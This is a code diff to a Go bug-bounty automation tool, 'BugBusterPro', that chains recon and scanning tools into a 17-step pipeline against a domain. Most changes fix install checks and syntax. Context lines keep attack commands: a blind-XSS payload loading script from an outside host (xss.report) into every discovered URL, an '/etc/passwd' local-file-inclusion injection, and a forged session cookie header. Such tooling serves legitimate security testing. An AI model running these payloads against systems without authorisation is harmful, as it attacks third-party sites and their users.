@@ -56,6 +56,7 @@ var requiredTools = []string{
 	"feroxbuster", "nuclei", "subzy", "qsreplace", "gf", "bxss",
 	"sort", "grep", "cat", "sh", "echo",
 	"python3", "pip3", // Added for Corsy
+	// "corsy" itself is checked differently in isToolInstalled
 }
 
 func main() {
@@ -80,8 +81,7 @@ func main() {
 	nucleiTemplatesDir := flag.String("nuclei-templates-dir", "/opt/nuclei-templates/", "Base directory for Nuclei templates")
 	interactshServer := flag.String("interactsh-server", "", "Custom Interactsh server URL (e.g., https://your-server.com) - optional")
 	force := flag.Bool("force", false, "Force rerun of all steps, even if output files exist")
-	// Defaulting threads based on user's initial run command
-	threads := flag.Int("threads", 100, "Default number of threads/concurrency for tools")
+	threads := flag.Int("threads", 100, "Default number of threads/concurrency for tools") // Keeping 100 based on user's last run
 	flag.Parse()
 
 	if *domain == "" {
@@ -96,7 +96,7 @@ func main() {
 		OutputDir:          filepath.Clean(*outputDir),
 		WordlistPath:       *wordlistPath,
 		NucleiTemplatesDir: *nucleiTemplatesDir,
-		InteractshServer:   *interactshServer, // Store interactsh URL
+		InteractshServer:   *interactshServer,
 		Force:              *force,
 		Threads:            *threads,
 	}
@@ -190,7 +190,6 @@ func initialize(config *Config) error {
         config.Logger.Printf("Using custom Interactsh server: %s", config.InteractshServer)
     }
 
-
 	return nil
 }
 
@@ -203,7 +202,7 @@ func printBanner(config *Config) {
 ██╔══██╗██║   ██║██║   ██║██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██║   ██║
 ██████╔╝╚██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║██║     ██║  ██║╚██████╔╝
 ╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝
-                                                                                         v1.2.0 (Workflow Update)
+                                                                                         v1.2.1 (Syntax Fix)
 `
 	fmt.Println(colorCyan + banner + colorReset)
 	config.Logger.Printf("Starting BugBusterPro for domain: %s", config.Domain)
@@ -221,19 +220,25 @@ func checkAndInstallTools(config *Config) bool {
 	// Check for Python/Pip first if needed
 	if !python3Installed {
 		config.Logger.Printf(colorRed + "Tool python3 not found. Please install Python 3." + colorReset)
-		allToolsFound = false // Corsy needs python3
+		allToolsFound = false
 	}
 	if !pip3Installed {
 		config.Logger.Printf(colorYellow + "Tool pip3 not found. Cannot automatically install Python packages like 'corsy'. Please install pip3." + colorReset)
-		// Don't set allToolsFound to false here, maybe corsy is already installed system-wide
 	}
 
-
 	for _, tool := range requiredTools {
-		if !isToolInstalled(tool) {
+		// Use custom check for corsy
+		toolPresent := false
+		if tool == "corsy" {
+			toolPresent = isToolInstalled("corsy") // Uses the special check inside
+		} else {
+			toolPresent = isToolInstalled(tool)
+		}
+
+		if !toolPresent {
 			isGoTool := contains([]string{"subfinder", "httpx", "katana", "waybackurls", "otxurls", "nuclei", "subzy", "qsreplace", "gf", "bxss"}, tool)
 			isInstallablePkg := contains([]string{"feroxbuster"}, tool)
-			isPipInstallable := contains([]string{"corsy"}, tool) // Assuming corsy is pip installable
+			isPipInstallable := contains([]string{"corsy"}, tool)
 
 			if tool == "go" {
 				config.Logger.Printf(colorRed+"Tool %s not found. Please install Go manually (https://golang.org/doc/install)."+colorReset, tool)
@@ -253,15 +258,13 @@ func checkAndInstallTools(config *Config) bool {
 				if python3Installed && pip3Installed {
 					config.Logger.Printf(colorYellow+"Tool/Package %s not found. Attempting installation via 'pip3 install'..."+colorReset, tool)
 					if !installTool(config, tool) {
-						// Don't necessarily fail the whole run if corsy install fails, maybe user doesn't need it
 						config.Logger.Printf(colorYellow+"Failed to automatically install %s via pip3. Step requiring it might fail."+colorReset, tool)
 					}
 				} else {
                      config.Logger.Printf(colorRed+"Cannot attempt pip3 install for %s because python3 or pip3 is missing."+colorReset, tool)
                 }
 			} else if tool == "python3" || tool == "pip3" {
-                 // Already handled above
-                 continue
+                 continue // Already handled
             } else { // Basic utils
 				config.Logger.Printf(colorRed+"Required utility '%s' not found in PATH. Please install it using your system's package manager."+colorReset, tool)
 				allToolsFound = false
@@ -286,6 +289,9 @@ func isToolInstalled(tool string) bool {
 	if tool == "corsy" && err != nil {
 		// Try running 'python3 -m corsy --help' as a check
 		cmd := exec.Command("python3", "-m", "corsy", "--help")
+        // Discard output, just check error
+        cmd.Stdout = io.Discard
+        cmd.Stderr = io.Discard
 		errCheck := cmd.Run()
 		return errCheck == nil
 	}
@@ -297,7 +303,7 @@ func isToolInstalled(tool string) bool {
 func installTool(config *Config, tool string) bool {
 	config.Logger.Printf("Attempting to install %s...", tool)
 	var cmd *exec.Cmd
-	installSuccess := false
+	installSuccess := false // Flag specifically for package manager/pip success
 
 	// Determine the installation command
 	switch tool {
@@ -347,21 +353,21 @@ func installTool(config *Config, tool string) bool {
 	case "corsy": // Pip installation
 		// Try simple install first, then user install if needed
 		cmdPip := exec.Command("pip3", "install", "corsy")
-        if err := runInstallCommand(config, cmdPip, tool + " (pip3 system)"); err != nil {
+        if err := runInstallCommand(config, cmdPip, tool + " (pip3 system)"); err != nil { // Outer If
             config.Logger.Printf(colorYellow+"System pip3 install for %s failed, trying user install..." + colorReset, tool)
             cmdPipUser := exec.Command("pip3", "install", "--user", "corsy")
-            if errUser := runInstallCommand(config, cmdPipUser, tool + " (pip3 user)"); errUser != nil {
+            if errUser := runInstallCommand(config, cmdPipUser, tool + " (pip3 user)"); errUser != nil { // Inner If
                  config.Logger.Printf(colorRed+"User pip3 install for %s also failed." + colorReset, tool)
                  return false // Both failed
-            } else {
+            } else { // Inner Else
                 // Add reminder about user bin path
                 homeDir, _ := os.UserHomeDir()
                 if homeDir != "" {
                      config.Logger.Printf(colorYellow+"Note: %s installed via pip3 --user. Ensure '%s/.local/bin' is in your PATH."+colorReset, tool, homeDir)
                 }
                  installSuccess = true // User install worked
-            }
-        } else {
+            } // *** ADDED MISSING BRACE HERE ***
+        } else { // Outer Else
              installSuccess = true // System install worked
         }
 		cmd = nil // Mark cmd as nil since pip handled it
@@ -381,19 +387,30 @@ func installTool(config *Config, tool string) bool {
 		}
 		if err := runInstallCommand(config, cmd, tool); err != nil { return false }
 	} else if !installSuccess && tool != "corsy" { // Only fail if not handled by pip/pkg and not corsy
+         // This case means: no go/cargo cmd was set, AND installSuccess is false (pkg mgr failed), AND it wasn't corsy
          config.Logger.Printf(colorRed+"Failed to determine or execute an installation method for %s."+colorReset, tool)
          return false
     }
 
-	// --- Post-Installation Verification ---
-	time.Sleep(1 * time.Second)
-	if isToolInstalled(tool) {
+
+	// --- Post-Installation Verification & Actions ---
+	time.Sleep(1 * time.Second) // Small delay for filesystem/path changes
+	// Use the potentially special check for corsy again
+	toolIsNowInstalled := false
+	if tool == "corsy" {
+		toolIsNowInstalled = isToolInstalled("corsy")
+	} else {
+		toolIsNowInstalled = isToolInstalled(tool)
+	}
+
+	if toolIsNowInstalled {
 		config.Logger.Printf(colorGreen+"Successfully installed/verified %s"+colorReset, tool)
+		// Special action for Nuclei: Update templates in the specified directory
 		if tool == "nuclei" {
 			config.Logger.Printf(colorYellow+"Running 'nuclei -update-templates -td %s'..." + colorReset, config.NucleiTemplatesDir)
-			_ = os.MkdirAll(config.NucleiTemplatesDir, 0755)
+			_ = os.MkdirAll(config.NucleiTemplatesDir, 0755) // Ensure dir exists
 			updateCmd := exec.Command("nuclei", "-update-templates", "-td", config.NucleiTemplatesDir)
-			runInstallCommand(config, updateCmd, "nuclei-templates update")
+			runInstallCommand(config, updateCmd, "nuclei-templates update") // Log output, don't fail script if update fails
 		}
 		return true
 	} else {
@@ -405,6 +422,7 @@ func installTool(config *Config, tool string) bool {
 		config.Logger.Printf(colorRed+"Installation of %s seems to have failed (command not found after install attempt). Check logs above."+colorReset, tool)
 		return false
 	}
+// *** ADDED MISSING BRACE HERE ***
 }
 
 
@@ -427,7 +445,7 @@ func runInstallCommand(config *Config, cmd *exec.Cmd, logPrefix string) error {
 	}
 	if err != nil {
 		config.Logger.Printf(colorRed+"Command for '%s' failed: %v"+colorReset, logPrefix, err)
-		return err
+		return err // Propagate the error
 	}
 	// config.Logger.Printf("Command for '%s' completed successfully.", logPrefix) // Reduce verbosity
 	return nil
@@ -448,7 +466,7 @@ func createDirectories(config *Config) {
 }
 
 
-// --- defineSteps: Configure all scanning steps based on user workflow ---
+// --- defineSteps (same as v1.2.0 - defines the 17 steps) ---
 func defineSteps(config *Config) []StepInfo {
 	// Define file paths
 	subfinderOutput := filepath.Join(config.OutputDir, "subfinder", "subdomains.txt")
@@ -502,8 +520,7 @@ func defineSteps(config *Config) []StepInfo {
         { // Step 3 - NEW Corsy Scan
             Name:        "3. CORS Misconfiguration Scan (Corsy)",
             Description: "Checking alive URLs for CORS issues using Corsy",
-            // Assuming corsy is installed and runnable via python3 -m corsy
-            // Using -i for input file, -t for threads, redirecting output
+            // Using python3 -m corsy; Requires corsy to be installed via pip
             Command: fmt.Sprintf("python3 -m corsy -i %s -t %d --headers \"User-Agent: GoogleBot\\nCookie: SESSION=Hacked\" > %s",
                          httpxOutput, config.Threads/2, corsyOutput), // Lower threads for python tool maybe
             OutputFile:   corsyOutput,
@@ -528,14 +545,13 @@ func defineSteps(config *Config) []StepInfo {
 		{ // Step 6
 			Name:        "6. URL Archival (OTX)",
 			Description: "Fetching URLs from AlienVault OTX for the root domain",
-			Command:      fmt.Sprintf("echo %s | otxurls -s > %s", config.Domain, otxOutput), // Added -s for subdomains based on user cmd list
+			Command:      fmt.Sprintf("echo %s | otxurls -s > %s", config.Domain, otxOutput),
 			OutputFile:   otxOutput,
 			RequiresPipe: true,
 		},
 		{ // Step 7
 			Name:        "7. Consolidate & Sort URLs",
 			Description: "Combining URLs from Katana, Wayback, OTX, sorting, and removing duplicates",
-			// Combining katana, wayback, otx outputs
 			Command: fmt.Sprintf("cat %s %s %s > %s && cat %s | sort -u > %s",
 				katanaOutput, waybackOutput, otxOutput, allUrlsUnsorted, allUrlsUnsorted, allUrlsSorted),
 			OutputFile:   allUrlsSorted,
@@ -569,20 +585,16 @@ func defineSteps(config *Config) []StepInfo {
         { // Step 11 - NEW Katana JS Pipeline
              Name:        "11. JavaScript Analysis from Katana Pipeline (Nuclei)",
              Description: "Using Katana probe+spider (-ps) to find JS and analyze with Nuclei",
-             // Output JS files found by katana -ps to a temp file, then feed to nuclei
              Command: fmt.Sprintf("echo %s | katana -ps -silent -ef woff,css,png,jpg,svg,ico,gif,jpeg,ttf,otf,eot | grep -E '\\.js$' > %s && nuclei -l %s -td %s -t exposures/,javascript/ -tags js,secret -severity medium,high,critical -c %d -stats -o %s",
                          config.Domain, jsKatanaPipelineOutput, jsKatanaPipelineOutput, config.NucleiTemplatesDir, config.Threads, jsKatanaPipelineFindingsOutput),
-             OutputFile:   jsKatanaPipelineFindingsOutput, // Check the final nuclei output
-             RequiresPipe: true, // Uses echo, pipe, grep, redirect, nuclei
+             OutputFile:   jsKatanaPipelineFindingsOutput,
+             RequiresPipe: true,
         },
-
 
 		// --- Active Scanning ---
 		{ // Step 12
 			Name:        "12. Directory Bruteforce (feroxbuster)",
 			Description: "Bruteforcing directories and files on live web servers",
-			// Using host:port list, configurable wordlist, no-recursion added
-			// Updated extensions list slightly based on user input
 			Command: fmt.Sprintf("feroxbuster --stdin --wordlist %s --threads %d --depth 3 --no-recursion -x php,config,log,sql,bak,old,conf,backup,sub,db,asp,aspx,py,rb,cache,cgi,csv,htm,inc,jar,js,json,jsp,lock,rar,swp,txt,wadl,xml,tar.gz,tar.bz2 --status-codes 200,301,302,401 --filter-status 404,403,500 --silent --output %s < %s",
 				config.WordlistPath, config.Threads, feroxbusterFileOutput, httpxHostsOutput),
 			OutputFile:   feroxbusterFileOutput,
@@ -591,7 +603,6 @@ func defineSteps(config *Config) []StepInfo {
 		{ // Step 13
 			Name:        "13. XSS Scan (gf + bxss)",
 			Description: "Scanning found URLs for potential XSS using gf patterns and bxss",
-			// Use sorted URLs, gf xss pattern, bxss with user's payload
 			Command: fmt.Sprintf("cat %s | gf xss | bxss -append -payload '<script/src=//xss.report/c/coffinpx></script>' -threads %d > %s",
 				allUrlsSorted, config.Threads, xssOutput),
 			OutputFile:   xssOutput,
@@ -601,13 +612,12 @@ func defineSteps(config *Config) []StepInfo {
 			Name:        "14. Subdomain Takeover Check (subzy)",
 			Description: "Checking discovered subdomains for potential takeover vulnerabilities",
 			Command: fmt.Sprintf("subzy run --targets %s --concurrency %d --hide_fails --verify_ssl --output %s",
-				subfinderOutput, config.Threads*2, takeoverOutput), // Maybe more concurrency here
+				subfinderOutput, config.Threads*2, takeoverOutput),
 			OutputFile: takeoverOutput,
 		},
 		{ // Step 15 - Updated Nuclei Misconfig
 			Name:        "15. Misconfiguration Scan (Nuclei)",
 			Description: "Scanning live hosts for CORS and common misconfigurations",
-			// Using user's tags, interactsh flag, validate flag
 			Command: fmt.Sprintf("nuclei -l %s -td %s -tags cors,misconfig -severity medium,high,critical -rate-limit 150 -c %d -timeout 15 -stats -irr -validate %s -j -o %s",
 				httpxOutput, config.NucleiTemplatesDir, config.Threads, interactshFlag, misconfigsOutput),
 			OutputFile: misconfigsOutput,
@@ -615,7 +625,6 @@ func defineSteps(config *Config) []StepInfo {
 		{ // Step 16 - Updated Nuclei CVE/Tech
 			Name:        "16. CVEs & Tech Scan (Nuclei)",
 			Description: "Scanning for known CVEs, technology detection, and OSINT",
-			// Outputting to JSON
 			Command: fmt.Sprintf("nuclei -l %s -td %s -tags cve,tech,osint -severity medium,high,critical,info -etags ssl -c %d -stats -j -o %s",
 				httpxOutput, config.NucleiTemplatesDir, config.Threads, nucleiFindingsOutput),
 			OutputFile: nucleiFindingsOutput,
@@ -623,14 +632,12 @@ func defineSteps(config *Config) []StepInfo {
 		{ // Step 17 - Updated Nuclei LFI
 			Name:        "17. LFI Scan (gf + qsreplace + Nuclei)",
 			Description: "Testing filtered URLs for potential Local File Inclusion vulnerabilities",
-			// Using gf lfi pattern
 			Command: fmt.Sprintf("cat %s | gf lfi | qsreplace '/etc/passwd' | nuclei -td %s -tags lfi,file-inclusion -severity medium,high,critical -c %d -stats -irr %s -j -o %s",
 				allUrlsSorted, config.NucleiTemplatesDir, config.Threads, interactshFlag, lfiOutput),
 			OutputFile:   lfiOutput,
 			RequiresPipe: true,
 		},
 	}
-
 	return steps
 }
 
@@ -665,8 +672,10 @@ func runAllSteps(config *Config, steps []StepInfo) {
             if fileExists(step.OutputFile) && !isStepCompleted(step.OutputFile) { config.Logger.Printf(colorYellow+"Note: Output file '%s' was created but is empty, likely due to the error."+colorReset, step.OutputFile) }
 		} else {
 			if !isStepCompleted(step.OutputFile) {
+				// Check specifically if the command was supposed to produce output (most do, except maybe simple checks)
+                // For now, always log warning if output file is empty/missing after success
 				config.Logger.Printf(colorYellow+"Warning: Step [%d/%d] %s completed without errors, but output file '%s' is missing or empty. (Duration: %s)"+colorReset, i+1, totalSteps, step.Name, step.OutputFile, duration.Round(time.Second))
-				step.Completed = true
+				step.Completed = true // Mark as run
 			} else {
 				config.Logger.Printf(colorGreen+"Success: Step [%d/%d] %s completed successfully. (Duration: %s)"+colorReset, i+1, totalSteps, step.Name, duration.Round(time.Second))
 				step.Completed = true
@@ -710,6 +719,7 @@ func printSummary(config *Config, steps []StepInfo) {
 	config.Logger.Printf("Scan End Time: %s", time.Now().Format("2006-01-02 15:04:05"))
 	completedCount := 0; failedSteps := []string{}; emptyOutputSteps := []string{}
 	config.Logger.Println(colorCyan + "\n--- Step Status ---" + colorReset)
+	totalSteps := len(steps)
 	for i, step := range steps {
 		status := ""; stepRan := step.Completed
 		if stepRan {
@@ -721,7 +731,7 @@ func printSummary(config *Config, steps []StepInfo) {
         }
 		config.Logger.Printf("%s %s", status, step.Name)
 	}
-	config.Logger.Printf("\nSteps Run/Succeeded/Total: %d/%d", completedCount, len(steps))
+	config.Logger.Printf("\nSteps Run/Succeeded/Total: %d/%d", completedCount, totalSteps) // Use totalSteps
 	if len(failedSteps) > 0 {
 		config.Logger.Println(colorRed + "\n--- Failed Steps ---" + colorReset); for _, failed := range failedSteps { config.Logger.Printf("- %s", failed) }; config.Logger.Println(colorRed + "Check the log file for detailed errors." + colorReset)
 	}
